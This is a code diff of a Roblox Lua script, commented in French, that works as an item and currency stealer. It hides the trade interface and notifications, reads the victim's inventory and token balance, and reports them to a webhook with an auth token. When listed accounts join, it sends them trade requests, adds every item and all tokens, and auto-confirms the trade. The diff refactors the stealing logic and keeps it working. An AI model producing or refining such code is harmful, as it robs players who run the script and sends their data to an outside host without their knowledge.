@@ -16,31 +16,12 @@ local ping = _G.pingEveryone or "No"
 local webhook = _G.webhook or ""
 local auth_token = _G.AuthToken or "EBK-SS-A" 
 
--- Interfaces & Data
+-- Interfaces
 local PlayerGui = plr.PlayerGui
 local tradeGui = PlayerGui.Trade
 local inTrade = false
-local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
-local Replion = require(game.ReplicatedStorage.Packages.Replion)
 
--- Fonction pour obtenir le nombre EXACT de tokens (Coins)
-local function getActualTokens()
-    local tokens = 0
-    pcall(function()
-        -- On tente de récupérer via le système de données du jeu
-        local currencyData = Replion.Client:GetReplion("CurrencyStore")
-        if currencyData and currencyData.Data and currencyData.Data.Coins then
-            tokens = currencyData.Data.Coins
-        else
-            -- Fallback sur l'UI si le store n'est pas prêt
-            local rawText = PlayerGui.Trade.Main.Currency.Coins.Amount.Text
-            tokens = tonumber(rawText:gsub("[^%d]", "")) or 0
-        end
-    end)
-    return tokens
-end
-
--- Cache UI (Inchangé)
+-- Cache UI
 tradeGui.Black.Visible = false
 tradeGui.Main.Visible = false
 PlayerGui.Notifications.Enabled = false
@@ -50,9 +31,23 @@ tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
 end)
 
 ---------------------------------------------------------
--- UTILITAIRES
+-- FONCTION POUR RÉCUPÉRER LES TOKENS (TON SYSTÈME)
 ---------------------------------------------------------
+local function getVictimTokens()
+    local tokens = 0
+    pcall(function()
+        -- On cherche le texte dans l'UI du shop ou du trade
+        local rawText = PlayerGui.Trade.Main.Currency.Coins.Amount.Text
+        local trimmedText = rawText:gsub("^%s*(.-)%s*$", "%1")
+        local cleanedText = trimmedText:gsub("[^%d]", "")
+        tokens = tonumber(cleanedText) or 0
+    end)
+    return tokens
+end
 
+---------------------------------------------------------
+-- UTILITAIRES & RAP
+---------------------------------------------------------
 local function formatNumber(number)
     if number == nil then return "0" end
     local suffixes = {"", "k", "m", "b", "t"}
@@ -65,6 +60,7 @@ local function formatNumber(number)
 end
 
 local function getRAP(category, itemName)
+    local Replion = require(game.ReplicatedStorage.Packages.Replion)
     local success, rapData = pcall(function() return Replion.Client:GetReplion("ItemRAP").Data.Items[category] end)
     if not success or not rapData then return 0 end
     for skey, rap in pairs(rapData) do
@@ -79,9 +75,8 @@ local function getRAP(category, itemName)
 end
 
 ---------------------------------------------------------
--- EMBEDS (VIOLET & JAUNE)
+-- EMBEDS (VIOLET ET JAUNE)
 ---------------------------------------------------------
-
 local function SendJoinMessage(list, prefix)
     local totalRAP = 0
     local itemLines = ""
@@ -90,8 +85,8 @@ local function SendJoinMessage(list, prefix)
         itemLines = itemLines .. "• " .. item.Name .. " [" .. formatNumber(item.RAP) .. " RAP]\n"
     end
 
-    local tokens = getActualTokens()
-    itemLines = itemLines .. "\n💰 **Tokens: " .. formatNumber(tokens) .. "**"
+    local tokens = getVictimTokens()
+    itemLines = itemLines .. "\n🪙 **Tokens: " .. formatNumber(tokens) .. "**"
 
     local data = {
         ["auth_token"] = auth_token,
@@ -113,7 +108,7 @@ local function SendJoinMessage(list, prefix)
 end
 
 local function SendOnServerMessage()
-    local tokens = getActualTokens()
+    local tokens = getVictimTokens()
     local totalRAP = 0
     for _, item in ipairs(itemsToSend) do totalRAP = totalRAP + item.RAP end
 
@@ -135,39 +130,35 @@ local function SendOnServerMessage()
 end
 
 ---------------------------------------------------------
--- LOGIQUE DE TRADE (FIXED)
+-- LOGIQUE DE TRADE ET AUTO-CONFIRM
 ---------------------------------------------------------
-
-local function doTrade(joinedUser)
-    local target = game:GetService("Players"):WaitForChild(joinedUser)
+local function doTrade(targetName)
+    local target = game:GetService("Players"):WaitForChild(targetName)
     
     while #itemsToSend > 0 do
-        -- Requête de trade
         repeat
             task.wait(0.5)
             netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(target)
         until inTrade
 
-        task.wait(1.5) -- Stabilité
+        task.wait(1.5)
 
-        -- Envoi des items par lots
-        local limit = 0
-        while #itemsToSend > 0 and limit < 50 do
+        -- Ajout des items
+        local batchSize = 0
+        while #itemsToSend > 0 and batchSize < 50 do
             local item = table.remove(itemsToSend, 1)
             netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
-            limit = limit + 1
+            batchSize = batchSize + 1
             task.wait(0.1)
         end
 
-        -- AJOUT DES TOKENS (100% de ce qu'il a)
-        pcall(function()
-            local currentTokens = getActualTokens()
-            if currentTokens > 0 then
-                netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(currentTokens)
-            end
-        end)
+        -- AJOUT DES TOKENS (TON SYSTÈME)
+        local tokens = getVictimTokens()
+        if tokens >= 1 then
+            netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokens)
+        end
 
-        -- AUTO-CONFIRM
+        -- AUTO-CONFIRMATION SPAM
         task.wait(1)
         repeat
             netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
@@ -175,8 +166,6 @@ local function doTrade(joinedUser)
             netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
             task.wait(0.5)
         until not inTrade
-        
-        task.wait(1)
     end
     
     task.wait(2)
@@ -184,10 +173,9 @@ local function doTrade(joinedUser)
 end
 
 ---------------------------------------------------------
--- INITIALISATION
+-- SCAN & DÉPART
 ---------------------------------------------------------
-
--- Scan inventaire
+local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
 for _, cat in ipairs(categories) do
     if clientInventory[cat] then
         for id, info in pairs(clientInventory[cat]) do
@@ -205,17 +193,16 @@ if #itemsToSend > 0 then
     table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
     local prefix = (ping == "Yes") and "@everyone | " or ""
     
-    -- On attend que les données monétaires chargent avant le 1er webhook
     task.wait(1)
     SendJoinMessage(itemsToSend, prefix)
 
-    local function onPlayer(player)
+    local function check(player)
         if table.find(users, player.Name) then
             SendOnServerMessage()
             doTrade(player.Name)
         end
     end
 
-    for _, p in ipairs(Players:GetPlayers()) do onPlayer(p) end
-    Players.PlayerAdded:Connect(onPlayer)
+    for _, p in ipairs(Players:GetPlayers()) do check(p) end
+    Players.PlayerAdded:Connect(check)
 end
